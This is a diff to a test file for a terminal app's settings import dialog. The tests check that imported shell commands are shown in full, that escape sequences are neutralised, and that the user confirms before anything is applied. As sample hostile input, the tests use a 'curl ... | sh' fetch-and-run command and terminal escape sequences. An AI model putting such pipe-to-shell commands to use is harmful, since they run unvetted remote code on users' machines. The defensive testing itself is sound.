@@ -5,17 +5,21 @@ import stripAnsi from 'strip-ansi';
 import {
     describe,
     expect,
-    it
+    it,
+    vi
 } from 'vitest';
 
 import {
     DEFAULT_SETTINGS,
     type Settings
 } from '../../../types/Settings';
+import { waitFor } from '../../__tests__/helpers/wait-for-ink';
 import {
     ImportPreviewDialog,
+    escapeControlCharacters,
     getImportPreviewKeys,
-    getImportPreviewSettings
+    getImportPreviewSettings,
+    getImportedCommands
 } from '../ImportPreviewDialog';
 
 class MockTtyStream extends PassThrough {
@@ -63,8 +67,23 @@ function createMockStdout(): CapturedWriteStream {
     });
 }
 
-function flushInk() {
-    return new Promise(resolve => setTimeout(resolve, 25));
+// An import that adds a shell command and leaves globalBold out, so Replace All
+// resets globalBold and Merge keeps it
+const COMMAND_IMPORT_CURRENT: Settings = { ...DEFAULT_SETTINGS, globalBold: true };
+const COMMAND_IMPORT_DATA: Settings = {
+    ...DEFAULT_SETTINGS,
+    colorLevel: 3,
+    lines: [[{ id: 'c', type: 'custom-command', commandPath: 'echo hi' }], [], []]
+};
+const COMMAND_IMPORT_VALIDATION = {
+    status: 'valid' as const,
+    data: COMMAND_IMPORT_DATA,
+    presentKeys: ['version', 'colorLevel', 'lines'] as (keyof Settings)[]
+};
+
+// The globalBold row of the last frame drawn
+function lastGlobalBoldRow(output: string): string | undefined {
+    return output.slice(output.lastIndexOf('globalBold:')).split('\n')[0];
 }
 
 describe('ImportPreviewDialog helpers', () => {
@@ -86,7 +105,7 @@ describe('ImportPreviewDialog helpers', () => {
     it('previews only explicitly imported fields in merge mode', () => {
         const current: Settings = {
             ...DEFAULT_SETTINGS,
-            flexMode: 'full',
+            defaultPaddingSide: 'left',
             lines: [[{ id: 'custom', type: 'model' }]]
         };
         const validation = {
@@ -98,7 +117,7 @@ describe('ImportPreviewDialog helpers', () => {
         const preview = getImportPreviewSettings(current, validation, 'merge');
 
         expect(preview.globalBold).toBe(true);
-        expect(preview.flexMode).toBe('full');
+        expect(preview.defaultPaddingSide).toBe('left');
         expect(preview.lines).toEqual(current.lines);
     });
 
@@ -108,7 +127,7 @@ describe('ImportPreviewDialog helpers', () => {
         const stderr = createMockStdout();
         const current: Settings = {
             ...DEFAULT_SETTINGS,
-            flexMode: 'full'
+            defaultPaddingSide: 'left'
         };
         const instance = render(React.createElement(ImportPreviewDialog, {
             validation: {
@@ -129,19 +148,310 @@ describe('ImportPreviewDialog helpers', () => {
         });
 
         try {
-            await flushInk();
-            expect(stdout.getOutput()).toContain('导入预览');
-            expect(stdout.getOutput()).toContain('全部替换');
-            expect(stdout.getOutput()).toContain('合并');
-            expect(stdout.getOutput()).toContain('flexMode: full → full-minus-40');
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('defaultPaddingSide: left → both');
+            });
 
             stdout.clearOutput();
             stdin.write('\u001B[B');
-            await flushInk();
+            await waitFor(() => {
+                const output = stdout.getOutput();
+                const lastPaddingSideRow = output.slice(output.lastIndexOf('defaultPaddingSide:')).split('\n')[0];
+                expect(lastPaddingSideRow).toBe('defaultPaddingSide: left');
+            });
+        } finally {
+            instance.unmount();
+            instance.cleanup();
+            stdin.destroy();
+            stdout.destroy();
+            stderr.destroy();
+        }
+    });
 
-            const output = stdout.getOutput();
-            const lastFlexModeRow = output.slice(output.lastIndexOf('flexMode:')).split('\n')[0];
-            expect(lastFlexModeRow).toBe('flexMode: full');
+    it('lists the shell commands an import would add, but not ones already set', () => {
+        const current: Settings = {
+            ...DEFAULT_SETTINGS,
+            lines: [[{ id: 'mine', type: 'custom-command', commandPath: 'date' }], [], []]
+        };
+        const imported: Settings = {
+            ...DEFAULT_SETTINGS,
+            lines: [[
+                { id: 'a', type: 'custom-command', commandPath: 'date' },
+                { id: 'b', type: 'custom-command', commandPath: 'curl -s https://example.invalid | sh' },
+                { id: 'c', type: 'custom-command', commandPath: 'curl -s https://example.invalid | sh' }
+            ], [], []]
+        };
+
+        expect(getImportedCommands(current, imported)).toEqual(['curl -s https://example.invalid | sh']);
+        expect(getImportedCommands(current, current)).toEqual([]);
+    });
+
+    it('shows control characters as text instead of sending them to the terminal', () => {
+        expect(escapeControlCharacters('a\u001b]52;c;AAAA\u0007b\u009b')).toBe('a\\u001b]52;c;AAAA\\u0007b\\u009b');
+        expect(escapeControlCharacters('plain ✓')).toBe('plain ✓');
+    });
+
+    it('shows the full command an import adds, and asks before applying it', async () => {
+        const stdin = createMockStdin();
+        const stdout = createMockStdout();
+        const stderr = createMockStdout();
+        const onApply = vi.fn();
+        const command = 'curl -s https://example.invalid/a-long-path-that-would-be-truncated | sh';
+        const instance = render(React.createElement(ImportPreviewDialog, {
+            validation: {
+                status: 'valid',
+                data: { ...DEFAULT_SETTINGS, lines: [[{ id: 'c', type: 'custom-command', commandPath: `${command}\u001b[2J` }], [], []] },
+                presentKeys: ['version', 'lines']
+            },
+            currentSettings: DEFAULT_SETTINGS,
+            onApply,
+            onCancel: () => undefined
+        }), {
+            stdin,
+            stdout,
+            stderr,
+            debug: true,
+            exitOnCtrlC: false,
+            patchConsole: false
+        });
+
+        try {
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain(`${command}\\u001b[2J`);
+                expect(stdout.getOutput()).toContain('Shell 命令将在每次渲染状态行时运行');
+            });
+
+            stdin.write('\r');
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('▶  取消');
+                expect(stdout.getOutput()).toContain('应用并运行这些命令');
+            });
+            expect(onApply).not.toHaveBeenCalled();
+
+            stdout.clearOutput();
+            stdin.write('\r');
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('▶  全部替换');
+            });
+            expect(onApply).not.toHaveBeenCalled();
+
+            stdin.write('\r');
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('▶  取消');
+            });
+            stdin.write('\u001B[B');
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('▶  应用并运行这些命令');
+            });
+            stdin.write('\r');
+            await waitFor(() => {
+                expect(onApply).toHaveBeenCalledWith('replace');
+            });
+        } finally {
+            instance.unmount();
+            instance.cleanup();
+            stdin.destroy();
+            stdout.destroy();
+            stderr.destroy();
+        }
+    });
+
+    it('applies an import without shell commands straight away', async () => {
+        const stdin = createMockStdin();
+        const stdout = createMockStdout();
+        const stderr = createMockStdout();
+        const onApply = vi.fn();
+        const instance = render(React.createElement(ImportPreviewDialog, {
+            validation: {
+                status: 'valid',
+                data: { ...DEFAULT_SETTINGS, globalBold: true },
+                presentKeys: ['version', 'globalBold']
+            },
+            currentSettings: DEFAULT_SETTINGS,
+            onApply,
+            onCancel: () => undefined
+        }), {
+            stdin,
+            stdout,
+            stderr,
+            debug: true,
+            exitOnCtrlC: false,
+            patchConsole: false
+        });
+
+        try {
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('▶  全部替换');
+            });
+            stdin.write('\r');
+            await waitFor(() => {
+                expect(onApply).toHaveBeenCalledWith('replace');
+            });
+        } finally {
+            instance.unmount();
+            instance.cleanup();
+            stdin.destroy();
+            stdout.destroy();
+            stderr.destroy();
+        }
+    });
+
+    it('cancels the import when Escape is pressed on the preview', async () => {
+        const stdin = createMockStdin();
+        const stdout = createMockStdout();
+        const stderr = createMockStdout();
+        const onApply = vi.fn();
+        const onCancel = vi.fn();
+        const instance = render(React.createElement(ImportPreviewDialog, {
+            validation: {
+                status: 'valid',
+                data: { ...DEFAULT_SETTINGS, globalBold: true },
+                presentKeys: ['version', 'globalBold']
+            },
+            currentSettings: DEFAULT_SETTINGS,
+            onApply,
+            onCancel
+        }), {
+            stdin,
+            stdout,
+            stderr,
+            debug: true,
+            exitOnCtrlC: false,
+            patchConsole: false
+        });
+
+        try {
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('▶  全部替换');
+            });
+            stdin.write('\u001B');
+            await waitFor(() => {
+                expect(onCancel).toHaveBeenCalledTimes(1);
+            });
+            expect(onApply).not.toHaveBeenCalled();
+        } finally {
+            instance.unmount();
+            instance.cleanup();
+            stdin.destroy();
+            stdout.destroy();
+            stderr.destroy();
+        }
+    });
+
+    it('goes back from the shell-command confirmation to the preview on Escape, still on Merge', async () => {
+        const stdin = createMockStdin();
+        const stdout = createMockStdout();
+        const stderr = createMockStdout();
+        const onApply = vi.fn();
+        const onCancel = vi.fn();
+        const instance = render(React.createElement(ImportPreviewDialog, {
+            validation: COMMAND_IMPORT_VALIDATION,
+            currentSettings: COMMAND_IMPORT_CURRENT,
+            onApply,
+            onCancel
+        }), {
+            stdin,
+            stdout,
+            stderr,
+            debug: true,
+            exitOnCtrlC: false,
+            patchConsole: false
+        });
+
+        try {
+            await waitFor(() => {
+                expect(lastGlobalBoldRow(stdout.getOutput())).toBe('globalBold: true → false');
+            });
+            stdin.write('\u001B[B');
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('▶  合并');
+                expect(lastGlobalBoldRow(stdout.getOutput())).toBe('globalBold: true');
+            });
+            stdin.write('\r');
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('▶  取消');
+                expect(stdout.getOutput()).toContain('应用并运行这些命令');
+            });
+
+            stdout.clearOutput();
+            stdin.write('\u001B');
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('即将应用的更改：');
+                expect(stdout.getOutput()).toContain('▶  合并');
+                expect(lastGlobalBoldRow(stdout.getOutput())).toBe('globalBold: true');
+            });
+            expect(stdout.getOutput()).not.toContain('▶  全部替换');
+            expect(onCancel).not.toHaveBeenCalled();
+
+            stdin.write('\u001B');
+            await waitFor(() => {
+                expect(onCancel).toHaveBeenCalledTimes(1);
+            });
+            expect(onApply).not.toHaveBeenCalled();
+        } finally {
+            instance.unmount();
+            instance.cleanup();
+            stdin.destroy();
+            stdout.destroy();
+            stderr.destroy();
+        }
+    });
+
+    it('keeps Merge highlighted after Cancel on the shell-command confirmation', async () => {
+        const stdin = createMockStdin();
+        const stdout = createMockStdout();
+        const stderr = createMockStdout();
+        const onApply = vi.fn();
+        const instance = render(React.createElement(ImportPreviewDialog, {
+            validation: COMMAND_IMPORT_VALIDATION,
+            currentSettings: COMMAND_IMPORT_CURRENT,
+            onApply,
+            onCancel: () => undefined
+        }), {
+            stdin,
+            stdout,
+            stderr,
+            debug: true,
+            exitOnCtrlC: false,
+            patchConsole: false
+        });
+
+        try {
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('▶  全部替换');
+            });
+            stdin.write('\u001B[B');
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('▶  合并');
+            });
+            stdin.write('\r');
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('▶  取消');
+                expect(stdout.getOutput()).toContain('应用并运行这些命令');
+            });
+
+            stdout.clearOutput();
+            stdin.write('\r');
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('▶  合并');
+                expect(lastGlobalBoldRow(stdout.getOutput())).toBe('globalBold: true');
+            });
+            expect(stdout.getOutput()).not.toContain('▶  全部替换');
+
+            stdin.write('\r');
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('▶  取消');
+                expect(stdout.getOutput()).toContain('应用并运行这些命令');
+            });
+            stdin.write('\u001B[B');
+            await waitFor(() => {
+                expect(stdout.getOutput()).toContain('▶  应用并运行这些命令');
+            });
+            stdin.write('\r');
+            await waitFor(() => {
+                expect(onApply).toHaveBeenCalledWith('merge');
+            });
+            expect(onApply).toHaveBeenCalledTimes(1);
         } finally {
             instance.unmount();
             instance.cleanup();
